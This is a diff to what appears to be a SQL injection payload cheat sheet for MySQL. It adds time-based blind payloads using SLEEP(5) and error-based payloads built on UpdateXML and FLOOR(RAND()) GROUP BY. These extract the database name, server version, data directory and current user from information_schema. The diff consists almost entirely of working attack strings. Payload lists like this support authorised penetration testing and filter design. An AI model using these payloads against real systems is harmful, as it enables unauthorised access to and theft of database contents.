@@ -1011,7 +1011,19 @@ select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)
 
 SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables
 
+SELECT version() FROM (SELECT(SLEEP(5))) a
 
+SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a
+
+SELECT TRIM(UpdateXML(CONCAT('.',database(),'--',(SELECT (ELT(1=1,@@version))),concat('--',@@datadir)), '_Y000_', '1111'))
+
+SELECT * FROM (SELECT count(*), CONCAT((select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))), 0x23, FLOOR(RAND(0)*1)) AS x FROM information_schema.columns GROUP BY x) y
+
+Select if(now()=sysdate(),(select table_name),0) from information_schema.tables
+
+select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))
+
+SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*4)) AS Y000 FROM information_schema.tables GROUP BY Y000) x
 
 ```
 
